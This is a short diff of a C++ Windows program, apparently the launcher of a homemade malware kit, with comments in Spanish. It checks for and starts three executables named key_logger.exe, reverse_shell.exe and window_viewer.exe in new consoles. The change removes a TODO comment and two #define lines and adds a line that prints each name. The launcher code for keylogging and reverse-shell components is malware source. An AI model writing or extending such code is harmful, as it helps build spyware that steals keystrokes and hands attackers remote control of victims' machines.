@@ -5,12 +5,8 @@
 #include <cstring>
 #pragma comment(lib, "Ws2_32.lib")
 
-// TODO: Arreglar el tema de q el hilo secundario aun sigue aun q se cause un error en el hilo principal causa error
-
 std::string programs[] = {"key_logger.exe", "reverse_shell.exe", "window_viewer.exe"};
 
-#define key_logger_name "key_logger.exe"
-#define reverse_shell_name "reverse_shell.exe"
 int main()
 {
     // Verificar si estan todos los archivos
@@ -28,6 +24,7 @@ int main()
     // ejecutar todos los archivos
     for (std::string i : programs)
     {
+        std::cout << i << std::endl;
         STARTUPINFO si = {sizeof(si)};
         PROCESS_INFORMATION pi;
         if (!CreateProcess(NULL, (LPSTR)i.data(), NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
